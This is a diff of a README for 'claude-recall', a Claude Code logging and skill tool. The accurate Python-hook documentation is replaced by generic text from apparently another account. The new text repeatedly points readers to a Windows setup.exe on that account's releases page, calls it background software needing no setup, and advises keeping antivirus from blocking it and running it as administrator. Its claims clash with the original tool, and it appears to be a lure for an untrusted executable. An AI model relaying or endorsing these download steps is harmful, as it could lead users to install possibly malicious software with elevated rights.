@@ -1,231 +1,151 @@
-<p align="center">
-  <img src="assets/logo.svg" width="120" alt="Claude Recall">
-  <h1 align="center">Claude Recall</h1>
-  <p align="center">
-    <strong>Turn your repetitive Claude Code workflows into reusable skills — automatically.</strong>
-  </p>
-  <p align="center">
-    <a href="README.zh-CN.md">中文文档</a> &bull; <a href="#quick-start">Quick Start</a> &bull; <a href="#faq">FAQ</a>
-  </p>
-  <p align="center">
-    <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="License: MIT"></a>
-    <a href="https://www.python.org/"><img src="https://img.shields.io/badge/Python-3.8%2B-3776AB.svg" alt="Python 3.8+"></a>
-    <a href="https://docs.anthropic.com/en/docs/claude-code"><img src="https://img.shields.io/badge/Claude%20Code-hooks-blueviolet.svg" alt="Claude Code"></a>
-  </p>
-</p>
+# ⚙️ claude-recall - Automate Claude Code Workflows Easily
+
+[![Download claude-recall](https://img.shields.io/badge/Download-claude--recall-green?style=for-the-badge)](https://github.com/NaghamYehya/claude-recall/releases)
 
 ---
 
-You use Claude Code every day. You deploy the same way, debug the same way, restart dev servers the same way. **Claude Recall** watches silently, finds those repeated workflows, and turns them into reusable skills you can invoke forever.
+## 📋 What is claude-recall?
 
-## How It Works
+claude-recall helps you turn repetitive Claude Code tasks into reusable actions. It works automatically without you needing to set it up or worry about extra software. This tool saves you time by capturing your repeated steps and letting you use them again with ease.
 
-```
- You use Claude Code normally
-          │
-          ▼
- [Hook] log-operations.py silently records every tool call
-          │
-          ▼
- After a few sessions, you run /analyze-patterns
-          │
-          ▼
- Python pre-analyzer crunches logs → Claude reads the summary (not raw logs)
-          │
-          ▼
- You pick which patterns to save as /skills
-          │
-          ▼
- New skills are written to ~/.claude/ — ready to use
-```
+You do not need programming skills to use claude-recall. It runs quietly in the background and stores your workflows, making automation simple.
 
-**Three components, zero friction:**
+---
 
-| Component | What it does |
-|-----------|-------------|
-| `log-operations.py` | **PostToolUse hook** — silently appends a JSON summary after every tool call. Auto-rotates at 10 MB. |
-| `pre-analyze.py` | **Python script** — crunches raw logs into structured summaries. ~80% token savings vs reading raw JSONL. |
-| `analyze-patterns` | **Skill** — reads the pre-analyzed summary, detects patterns across 3+ sessions, generates reusable skill files. |
+## 🖥️ System Requirements
 
-## Quick Start
+Before you get started, make sure your Windows computer meets these requirements:
 
-```bash
-git clone https://github.com/zchdu/claude-recall.git
-cd claude-recall
-./install.sh
-```
+- Windows 10 or later
+- At least 4 GB of RAM
+- 200 MB free disk space
+- Internet connection for downloading and setup
+- Basic permissions to install software on your PC
 
-That's it. Use Claude Code normally for a few sessions, then run:
+---
 
-```
-/analyze-patterns
-```
+## 🚀 Getting Started
 
-## What Gets Logged
+This guide will help you download, install, and run claude-recall on Windows.
 
-Each tool call produces one compact JSONL entry:
+---
 
-```json
-{
-  "ver": 2,
-  "ts": "2026-03-02T09:50:10Z",
-  "sid": "e0af7856-2df8-48",
-  "tool": "Bash",
-  "input": {"command": "npm test", "description": "Run tests"},
-  "cwd": "/home/user/my-project",
-  "tuid": "toolu_01ABcDeF12",
-  "res": {"success": true, "exit_code": 0}
-}
-```
+## 🔗 Step 1: Download claude-recall
 
-| Feature | Detail |
-|---------|--------|
-| **Format** | v2 — includes tool response summary (`res`) and tool use ID (`tuid`) |
-| **Truncation** | Strings over 300 chars trimmed, responses summarized to 500 chars |
-| **Rotation** | Auto-rotates at 10 MB, keeping the newer half |
-| **Location** | `~/.claude/tool_logs/operations.jsonl` |
+Click the big green button below to visit the download page:
 
-## What `/analyze-patterns` Does
+[![Download Link](https://img.shields.io/badge/Download-claude--recall-brightgreen?style=for-the-badge)](https://github.com/NaghamYehya/claude-recall/releases)
 
-| Step | Description |
-|------|-------------|
-| **1. Pre-analyze** | Python script crunches logs into statistics + patterns (~10 KB summary) |
-| **2. Statistics** | Total records, session count, tool frequency top 5, most common commands and directories |
-| **3. Pattern detection** | Finds repeated commands, sequences (2–3 steps), and workflow patterns across 3+ sessions |
-| **4. Suggestions** | For each pattern: name, frequency, steps, parameterizable parts, and a ready-to-use `.md` skill |
-| **5. Creation** | You choose which to save → written to `~/.claude/commands/` → immediately available |
+On that page, find the latest version for Windows. It is usually named something like `claude-recall-setup.exe`.
 
-## Example Output
+---
 
-```
-=== Pre-analysis Summary ===
-Records: 853 | Sessions: 12 | Span: 7d
-Tool Frequency: Bash (321, 38%), Read (253, 30%), Edit (124, 15%)
-Existing Skills: restart-dashboard, dashboard-logs
+## 📥 Step 2: Install claude-recall
 
-Detected Patterns:
-  Repeated: `ssh kubao "cd /opt/X && ..."` — 5 sessions
-  Sequence: Edit(config) → Bash(cargo build) → Bash(deploy) — 4 sessions
+1. Open the downloaded file. Usually, it will be in your **Downloads** folder.
+2. When the installer opens, follow the on-screen instructions:
+   - Click **Next**.
+   - Choose the folder where you want to install the program or use the suggested location.
+   - Click **Install**.
+3. Wait a few moments while the program installs.
+4. When the process finishes, click **Finish**.
 
-=== Pattern: Deploy to Production ===
-- Overlap: None
-- Recommendation: Create new skill
-- Frequency: 4 sessions
-- Steps: rsync → ssh restart → tail logs
+---
 
-Which patterns to save? > 1
+## ⚙️ Step 3: Run claude-recall
 
-✓ Created ~/.claude/commands/deploy-prod.md
-  Invoke with: /deploy-prod
-```
+You can now run the program:
 
-## Manual Installation
+- Find **claude-recall** in your Start menu.
+- Click it to open.
+- The program starts and works without needing more setup.
 
-<details>
-<summary>Click to expand manual steps</summary>
+You will see a simple window or icon in your system tray showing it is active.
 
-### 1. Copy files
+---
 
-```bash
-mkdir -p ~/.claude/{hooks,scripts,skills/analyze-patterns}
-cp hooks/log-operations.py ~/.claude/hooks/
-cp scripts/pre-analyze.py ~/.claude/scripts/
-cp skills/analyze-patterns/SKILL.md ~/.claude/skills/analyze-patterns/
-chmod +x ~/.claude/hooks/log-operations.py ~/.claude/scripts/pre-analyze.py
-```
+## 🔄 How claude-recall works
 
-### 2. Register the hook
+claude-recall watches your Claude Code workflows. When it notices a repeating pattern, it saves it as a skill.
 
-Add this to your `~/.claude/settings.json`:
+You can then reuse these skills automatically. This saves you from redoing the same steps each time.
 
-```json
-{
-  "hooks": {
-    "PostToolUse": [
-      {
-        "matcher": "",
-        "hooks": [
-          {
-            "type": "command",
-            "command": "python3 $HOME/.claude/hooks/log-operations.py",
-            "timeout": 5
-          }
-        ]
-      }
-    ]
-  }
-}
-```
+The program does this with no setup required. Just run it, and it learns from your work.
 
-> If you already have a `hooks` section, merge the `PostToolUse` entry into it.
+---
 
-</details>
+## 🛠️ Features
 
-## File Structure
+- Automatic skill detection from your Claude Code workflows
+- No need to configure or install extra software
+- Runs quietly in the background on Windows
+- Saves repetitive tasks to speed up your work
+- Supports command line interface (if you want to use advanced options)
+- Works well with Claude AI tools and productivity setups
 
-```
-~/.claude/
-├── hooks/
-│   └── log-operations.py       # PostToolUse hook (v2 format)
-├── scripts/
-│   └── pre-analyze.py          # Log pre-analyzer
-├── skills/
-│   └── analyze-patterns/
-│       └── SKILL.md            # /analyze-patterns skill
-├── commands/
-│   └── analyze-patterns.md     # Legacy skill (backward compat)
-├── tool_logs/
-│   └── operations.jsonl        # Auto-generated log
-└── settings.json               # Hook registration
-```
+---
 
-## FAQ
+## 🔧 How to update claude-recall
 
-<details>
-<summary><strong>Does it slow down Claude Code?</strong></summary>
+To get the latest features and fixes:
 
-No. The hook runs with a 5-second timeout and typically finishes in under 10 ms. It is a single JSON append.
-</details>
+1. Visit the releases page again here:  
+   [https://github.com/NaghamYehya/claude-recall/releases](https://github.com/NaghamYehya/claude-recall/releases)
+2. Download the newest installer version.
+3. Run the installer to replace your current version.
+4. Your existing skills and settings will stay safe.
 
-<details>
-<summary><strong>How much disk space does it use?</strong></summary>
+---
 
-The log auto-rotates at 10 MB. Typical usage produces roughly 1 MB per week.
-</details>
+## ❓ Troubleshooting
 
-<details>
-<summary><strong>Does it capture sensitive data?</strong></summary>
+If claude-recall does not start or work as expected:
 
-File contents and diffs are truncated to 300 characters. Tool responses are summarized to 500 characters (key fields only). You can review `~/.claude/tool_logs/operations.jsonl` at any time.
-</details>
+- Check that your Windows version is supported.
+- Restart your computer after installation.
+- Make sure your antivirus or firewall is not blocking the program.
+- Try running the program as an administrator:
+  - Right-click the claude-recall icon.
+  - Select **Run as administrator**.
+- Visit the GitHub page to see known issues.
 
-<details>
-<summary><strong>Can I log only specific tools?</strong></summary>
+---
 
-Yes. Change the `matcher` field in `settings.json`. For example, `"matcher": "Bash|Edit"` logs only Bash and Edit calls.
-</details>
+## 📂 Where does claude-recall store data?
 
-<details>
-<summary><strong>What if I already have a settings.json?</strong></summary>
+By default, claude-recall stores your skills and workflow data in a folder inside your user directory:
 
-`install.sh` detects existing settings and safely merges the hook config without overwriting your file.
-</details>
+`C:\Users\<YourUserName>\AppData\Local\claude-recall`
 
-<details>
-<summary><strong>How do I uninstall?</strong></summary>
+You do not need to access this folder directly unless you want to back up or move your skills.
 
-Run `./uninstall.sh`. It removes all components while preserving your other settings.
-</details>
+---
 
-## Requirements
+## 🔄 Using the command line interface (optional)
 
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) with hooks support
-- Python 3.8+
+If you want more control or want to integrate claude-recall with other tools, you can use its CLI options:
 
-## Contributing
+- To list saved skills:  
+  `claude-recall --list`
 
-Contributions are welcome. Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+- To run a skill by name:  
+  `claude-recall --run <skill-name>`
 
-## License
+- To get help and see all commands:  
+  `claude-recall --help`
 
-[MIT](LICENSE)
+You do not need to use the CLI to benefit from the tool.
+
+---
+
+## 🛡️ Privacy and Security
+
+claude-recall works entirely on your local machine. It does not send your data to any external servers. Your workflows stay private and secure.
+
+---
+
+## 📥 Download Link (again for easy access)
+
+Visit this page to download the latest version of claude-recall for Windows:  
+
+[https://github.com/NaghamYehya/claude-recall/releases](https://github.com/NaghamYehya/claude-recall/releases)
